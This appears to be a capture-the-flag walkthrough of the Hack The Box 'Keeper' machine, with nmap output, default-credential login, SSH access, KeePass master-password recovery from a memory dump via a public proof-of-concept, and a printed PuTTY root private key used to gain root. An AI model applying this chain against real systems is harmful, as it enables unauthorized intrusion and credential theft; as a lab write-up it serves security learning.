# Keeper | HTB
### Difficulty Level: Easy
----------------------------------------

```bash
# Nmap 7.94SVN scan initiated Thu Apr 18 17:23:04 2024 as: nmap -A -T4 -p- -oN keeper.nmap 10.10.11.227
Nmap scan report for 10.10.11.227
Host is up (0.076s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/18%OT=22%CT=1%CU=30720%PV=Y%DS=2%DC=T%G=Y%TM=6621
OS:8FB3%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)S
OS:EQ(SP=FF%GCD=2%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST1
OS:1NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:3CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   83.33 ms 10.10.14.1
2   83.83 ms 10.10.11.227

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 18 17:25:07 2024 -- 1 IP address (1 host up) scanned in 123.42 seconds
```

There are 2 open ports:
22 - SSH
80 - HTTP

Add the machine address to /etc/hosts.
```bash
echo '10.10.11.227     keeper.htb' >> /etc/hosts
```

browse to the webpage:

![image](https://cdn-images-1.medium.com/max/1000/1*uu-dlBFqlNAZuLwN9TFBIg.png)

there is another subdoamin, add it to the file.

there is login page:

![image](https://miro.medium.com/v2/resize:fit:828/format:webp/1*iNdnfzvnlosEiroyw-CCyg.png)


check for default credentials:

![image](https://cdn-images-1.medium.com/max/1000/1*b8gh8j2vTZtqWD1_4TlBww.png)


and.. I'm in.

I checked the user panel and there is another username "lnorgaard".

there is comment with password.

![image](https://cdn-images-1.medium.com/max/1000/1*TJmGZzD2if37aOYvgDwyrQ.png)

we have credentials of user. let's connect it with ssh:

```bash
└─# ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$
```

we are in as inogaard.
There is user.txt flag.

there is zipfile. There are 2 files:

```bash
lnorgaard@keeper:~$ unzip RT30000.zip 
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx
```

there is kdbx that includes passwords and dump file that includes password to open the kdbx file.

I used this dumper from https://github.com/matro7sh/keepass-dump-masterkey

```bash
└─# python3 poc.py ../KeePassDumpFull.dmp 
2024-04-20 16:59:13,956 [.] [main] Opened ../KeePassDumpFull.dmp
Possible password: ●●dgr●d med fl●d
```

that's what i got from it.
I searched it in google and got it : Rødgrød Med Fløde maybe it can be rødgrød med fløde.

use this web app to unlock the file.
https://app.keeweb.info/
enter the password.

that's what I got:

```bash

PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

To convert a PuTTY private key (.ppk) to an SSH key (.pem), you can use the PuTTYgen tool in command-line mode.
The PuTTYgen tool provides a command-line interface for performing key conversions and operations.
Here's the command to convert a PuTTY private key (.ppk) to an SSH key (.pem) using PuTTYgen in command-line mode:

```bash
puttygen key.ppk -O private-openssh -o id_rsa
```
give it 600 per.

```bash
chmod 600 id_rsa
```

than use ptk to enter root user.

```bash
ssh root@keeper.htb -i id_rsa
```

and we are root.

```bash
└─# ssh root@keeper.htb -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Sat Apr 20 23:19:47 2024 from 10.10.14.30
root@keeper:~#
```






























